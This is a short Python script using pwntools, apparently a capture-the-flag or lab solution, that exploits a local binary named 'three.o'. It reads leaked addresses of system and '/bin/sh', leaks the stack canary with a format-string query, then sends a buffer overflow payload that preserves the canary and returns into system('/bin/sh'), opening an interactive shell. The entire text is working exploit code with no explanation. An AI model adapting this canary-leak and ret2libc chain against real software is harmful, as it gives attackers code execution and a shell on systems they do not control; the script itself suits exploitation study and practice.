from pwn import *
import struct
import sys

target = process("./three.o")

target.recvline()

message = target.recvline().decode("utf-8").split()
system = int(message[2].strip(','), 16)
binsh = int(message[5], 16)

target.recvuntil("query:")
target.sendline(b'%3$#x ')

canary = int(target.recvuntil("payload:").decode("utf-8").split()[0], 16)

ret = 0xffffffff

padding = b'\x41' * 8
payload = padding + struct.pack("<L", canary) + padding + struct.pack("<L", system) + struct.pack("<L", ret) + struct.pack("<L", binsh)

target.sendline(payload)
target.interactive()